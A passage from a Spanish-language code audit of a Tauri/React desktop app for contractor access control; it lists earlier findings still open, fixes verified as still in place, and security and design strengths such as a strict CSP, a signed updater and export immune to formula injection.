- Recomendación: aplicar las mismas correcciones que DF-02 y DF-10 antes de quitarlas de `SECCIONES_EN_DESARROLLO`.

---

## Estado respecto a auditorías previas

- **Pendientes previos que siguen abiertos:** el chequeo de gafete entre dispositivos (DF-06) y la restricción de roles en la GUI (DF-07), ambos en `docs/pendientes.md`.
- **Nada repetido de lo ya corregido:** se verificó que siguen vigentes estas correcciones:
  - ErrorBoundary por sección.
  - Carga de Historial con tope `truncado`.
  - Mensajes de login sin errores crudos.
  - `tsconfig strict` y ESLint en desktop.
  - Máscaras de entrada numéricas.
  - Remotos duplicados en Historial (`remotosSinDuplicarLocales`).
  - Módulos de AG Grid `RowApi`/`RowStyle` registrados.

## Aspectos bien resueltos

- No hay sinks de XSS, `react/no-danger` y `jsx-no-target-blank` son error de lint, y `overlayNoRowsTemplate` es una constante estática.
- CSP estricta en `tauri.conf.json` (`script-src 'self'`, `connect-src` solo hacia los dos proyectos Supabase) y capabilities mínimas (`dialog:allow-save`, `updater`, `process:allow-restart`).
- El updater verifica la firma con `pubkey`.
- `invoke()` confinado a `api/*`. Ninguna pantalla importa a otra hermana.
- Cero `any`, cero `@ts-ignore`, un solo cast `as unknown[]` bien filtrado después.
- `localStorage` solo guarda layouts y preferencias por usuario, siempre con `try/catch`.
- Las reglas de negocio críticas del ingreso de contratistas (acceso denegado, ingreso activo, gafete requerido, placa) se repiten en el backend (`registro_ingreso_service.rs:264-295`) y el cliente lo documenta.
- `useCargaAlCambiar` resuelve correctamente las respuestas fuera de orden en las grillas de catálogo. `nubeRealtime.ts` limpia todos los timers, canales y listeners, tiene backoff exponencial y renueva el token.
- `columnas` memoizadas, `getRowId` estable y el destello de celdas, lo que evita re-render y pérdida de layout en AG Grid.
- Contadores `enviando` y `disabled` en los botones de envío de los modales, y formularios con `react-hook-form` + `zod`.
- Las exportaciones XLSX y PDF se generan en Rust con `write_string`, así que son inmunes a la inyección de fórmulas.
